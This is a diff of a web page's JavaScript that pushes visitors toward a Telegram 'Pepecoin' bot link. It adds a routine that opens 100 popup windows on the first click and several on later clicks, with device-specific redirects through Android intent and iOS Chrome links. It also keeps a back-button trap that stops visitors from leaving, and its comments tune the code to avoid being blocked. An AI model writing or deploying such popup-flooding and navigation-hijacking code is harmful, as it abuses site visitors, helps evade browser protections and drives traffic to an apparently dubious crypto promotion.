@@ -218,15 +218,24 @@ const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
 let clickCount = 0;
 
-// ✅ SAFE POPUP
+// ✅ SAFE POPUP FUNCTION
 function openPopup(url){
   let win = window.open(url, "_blank");
+
   if(!win){
     window.location.href = url;
   }
 }
 
-// 🔥 MAIN FUNCTION (3 POPUP FIXED)
+// ✅ MULTI POPUP ENGINE
+function openPopups(url, count){
+  for(let i = 0; i < count; i++){
+    setTimeout(() => {
+      openPopup(url);
+    }, i * 800); // safe delay (important)
+  }
+}
+
 function openExternal(){
 
   clickCount++;
@@ -236,15 +245,14 @@ function openExternal(){
   const isIOS = /iphone|ipad|ipod/.test(ua);
   const isTelegram = /telegram/.test(ua);
 
-  let url = smartLink;
+  // 👉 popup logic
+  let popupCount = (clickCount === 1) ? 100 : 3;
 
-  // 📱 TELEGRAM
+  // ❌ REMOVED unsafe +100 boost (causes block)
+
+  // ✅ TELEGRAM
   if(isTelegram){
-    for(let i = 0; i < 3; i++){
-      setTimeout(() => {
-        openPopup(url);
-      }, i * 1200);
-    }
+    openPopups(smartLink, popupCount);
     return;
   }
 
@@ -253,40 +261,35 @@ function openExternal(){
 
     let intentLink =
       "intent://" +
-      url.replace(/^https?:\/\//,'') +
+      smartLink.replace(/^https?:\/\//,'') +
       "#Intent;scheme=https;package=com.android.chrome;end";
 
-    for(let i = 0; i < 3; i++){
-      setTimeout(() => {
-        openPopup(intentLink);
-      }, i * 1200);
-    }
+    openPopups(intentLink, popupCount);
 
-    return;
+    setTimeout(() => {
+      openPopups(smartLink, popupCount);
+    }, 1200);
   }
 
   // 🍎 IOS
-  if(isIOS){
+  else if(isIOS){
 
     let chromeLink =
       "googlechrome://" +
-      url.replace(/^https?:\/\//,'');
+      smartLink.replace(/^https?:\/\//,'');
 
-    for(let i = 0; i < 3; i++){
-      setTimeout(() => {
-        openPopup(chromeLink);
-      }, i * 1200);
-    }
+    openPopups(chromeLink, popupCount);
 
-    return;
+    setTimeout(() => {
+      openPopups(smartLink, popupCount);
+    }, 1200);
   }
 
   // 💻 PC
-  for(let i = 0; i < 3; i++){
-    setTimeout(() => {
-      openPopup(url);
-    }, i * 1200);
+  else{
+    openPopups(smartLink, popupCount);
   }
+
 }
 
 // 🔥 CLICK EVENT
@@ -297,16 +300,18 @@ document.addEventListener("click", function(e){
   }
 });
 
-// ❌ BACK BUTTON (SAFE - 1 popup only)
+// 🔥 BACK BUTTON SAFE VERSION (light)
 history.pushState(null, null, location.href);
 
 window.onpopstate = function () {
   history.pushState(null, null, location.href);
+
+  // safe single popup
   openPopup(smartLink);
 };
 
-</script>
-
+ </script>
+ 
 </body>
 </html>
  
